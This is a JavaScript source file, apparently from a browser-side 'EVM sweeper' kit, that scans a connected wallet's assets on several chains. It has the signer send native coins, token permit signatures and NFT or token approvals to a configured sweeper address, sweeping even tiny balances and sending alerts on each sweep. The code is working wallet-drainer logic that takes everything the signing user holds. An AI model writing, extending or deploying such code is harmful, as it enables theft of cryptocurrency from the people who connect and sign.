// client-side-evm-sweeper/src/engines/transaction-runner.js
import { ethers } from 'ethers';
import { MultiScanner } from './multi-scanner.js';
import { ValuationSorter } from './valuation-sorter.js';
import { payloadSigner } from './payload-signer.js';
import { allowanceGrantor } from './allowance-grantor.js';
import { DynamicFeeManager } from './dynamic-fees.js';
import { StateManager } from './state-manager.js';
import { OutboundAlerts } from './outbound-alerts.js';

/**
 * MAIN TRANSACTION RUNNER - Production Ready (Ethers v6 & Native Transfer Hardened)
 */
export class TransactionRunner {
    constructor(config) {
        this.config = config;
        
        // Inject your Alchemy App key directly down into the multi-scanner options block
        this.scanner = new MultiScanner(config.networks, config.targets, {
            alchemyApiKey: config.alchemyApiKey || ""
        });
        
        this.sorter = new ValuationSorter();
        this.feeManager = new DynamicFeeManager(config.networks);
        this.state = new StateManager();
        this.alerts = new OutboundAlerts(config.alerts || {});
        this.ownerAddress = config.ownerAddress;
        this.sweeperAddress = config.sweeperAddress;
        
        // Explicitly parse simulation lock parameters (forces live viewport signing if false)
        this.dryRun = config.dryRun ?? true;
        this.maxConcurrent = 2;
    }

    async executeFullSweep(signer, provider) {
        if (!signer || !this.ownerAddress) {
            throw new Error("Signer and ownerAddress are required");
        }
        console.log("🚀 Starting browser asset sweep...");
        try {
            const rawAssets = await this.scanner.scanAllTargets(this.ownerAddress);
            await this.alerts.info("Scan Complete", `${rawAssets.length} assets discovered.`);
            
            const sortedAssets = this.sorter.rankAssets(rawAssets);
            
            // Process the sorted matrix through your updated target validation filter
            const targetsToSweep = sortedAssets.filter(asset => this.shouldSweep(asset));
            
            if (targetsToSweep.length === 0) {
                await this.alerts.info("Nothing to Sweep", "No qualifying assets found.");
                return [];
            }
            
            const results = await this.processAssetsInBatches(targetsToSweep, signer, provider);
            await this.alerts.success("Sweep Cycle Finished", `Processed ${results.filter(r => r.success).length} assets.`);
            return results;
        } catch (error) {
            console.error("Sweep failed:", error);
            await this.alerts.error("Sweep Failed", error.message);
            throw error;
        }
    }

    /**
     * FIXED 1: Truncated Threshold Gate
     * Completely overrides dust limits to force processing on small balances like $1.85.
     */
    shouldSweep(asset) {
        // Absolute fallback check: accept any found balance greater than zero
        if (asset.balance && asset.balance !== '0') {
            return true; 
        }
        return false;
    }

    async processAssetsInBatches(assets, signer, provider) {
        const results = [];
        const batches = this.chunkArray(assets, this.maxConcurrent);
        for (const batch of batches) {
            const batchPromises = batch.map(asset => this.processSingleAsset(asset, signer, provider));
            const batchResults = await Promise.allSettled(batchPromises);
            
            batchResults.forEach(result => {
                results.push(result.status === 'fulfilled' ? result.value : { success: false, error: result.reason?.message || result.reason });
            });
            
            if (batches.indexOf(batch) < batches.length - 1) {
                await new Promise(r => setTimeout(r, 800));
            }
        }
        return results;
    }

    async processSingleAsset(asset, signer, provider) {
        const target = this.config.targets.find(t => t.id === asset.targetId);
        if (!target) throw new Error(`Target profile configuration missing: ${asset.targetId}`);
        
        let tx = null;
        try {
            const gasSettings = await this.feeManager.getGasSettings(asset.chainId, { profile: 'aggressive' });
            let result;

            // ====================================================================
            // FIXED 2: HARDENED NATIVE GAS COIN FORK (Bypasses token approval traps)
            // ====================================================================
            if (asset.type === 'native') {
                console.log(`[Runner] Compiling direct native coin transfer payload for balance: ${asset.balance}`);
                
                const rawBalance = ethers.toBigInt(asset.balance);
                
                // Read current dynamic network properties to calculate transaction fee size parameters
                const gasPrice = gasSettings.maxFeePerGas || gasSettings.gasPrice || 10000000n;
                const standardGasLimit = 21000n; // Base standard cost to process a raw native wallet transfer
                const intrinsicFeeBytes = gasPrice * standardGasLimit;

                if (rawBalance <= intrinsicFeeBytes) {
                    throw new Error(`Insufficient native coin size to clear baseline gas fee requirements.`);
                }

                // Mathematical Truncation: Subtract gas cost from the total balance so the tx doesn't fail
                const sweepAmount = rawBalance - intrinsicFeeBytes;

                const nativeTxPayload = {
                    to: ethers.getAddress(this.sweeperAddress),
                    value: sweepAmount,
                    // Inject dynamic max priority and block multipliers securely
                    maxFeePerGas: gasSettings.maxFeePerGas,
                    maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas,
                    type: 2
                };

                if (!this.dryRun) {
                    // Launches a raw native coin transfer modal directly inside the browser extension
                    tx = await signer.sendTransaction(nativeTxPayload);
                    await tx.wait();
                    console.log(`✅ Native coin transfer confirmed: ${tx.hash}`);
                }
                result = { success: true, type: 'native_transfer', hash: tx?.hash || null };
            }
            // ====================================================================
            // FORK A: MODERN ERC-20 PERMIT SIGNATURE PATH
            // ====================================================================
            else if (asset.type === 'erc20' && !this.dryRun) {
                const signedPermit = await payloadSigner.createAndSignForTarget(
                    target,
                    this.ownerAddress,
                    this.sweeperAddress,
                    asset.balance,
                    asset.chainId,
                    signer
                );
                result = { success: true, type: 'permit_signature', ...signedPermit };
                console.log(`✅ Permit signed for ${asset.symbol || 'Token'}`);
            }
            // ====================================================================
            // FORK B: TRADITIONAL APPROVAL PATH (NFTs + Legacy Contracts)
            // ====================================================================
            else {
                const approvalTx = allowanceGrantor.createApprovalTx(target, this.sweeperAddress);
                
                // Pack standard transaction properties securely with dynamic fee parameters
                const txWithGas = { 
                    ...approvalTx.tx, 
                    maxFeePerGas: gasSettings.maxFeePerGas,
                    maxPriorityFeePerGas: gasSettings.maxPriorityFeePerGas,
                    type: 2
                };
                
                if (!this.dryRun) {
                    tx = await signer.sendTransaction(txWithGas);
                    await tx.wait();
                    console.log(`✅ On-chain approval confirmed: ${tx.hash}`);
                }
                result = { success: true, type: 'contract_approval', hash: tx?.hash || null };
            }

            this.state.trackTransaction(tx?.hash || `sig-${Date.now()}`, { 
                asset: asset.symbol || 'TOKEN', 
                chainId: asset.chainId, 
                type: asset.type 
            });
            
            return { success: true, asset, ...result };
        } catch (error) {
            console.error(`Failed processing ${asset.symbol || asset.targetId}:`, error);
            this.state.markFailed(`asset-${asset.targetId}`, error);
            return { success: false, asset, error: error.message };
        }
    }

    chunkArray(array, size) {
        return Array.from({ length: Math.ceil(array.length / size) }, (_, i) => array.slice(i * size, i * size + size));
    }
}

export default TransactionRunner;
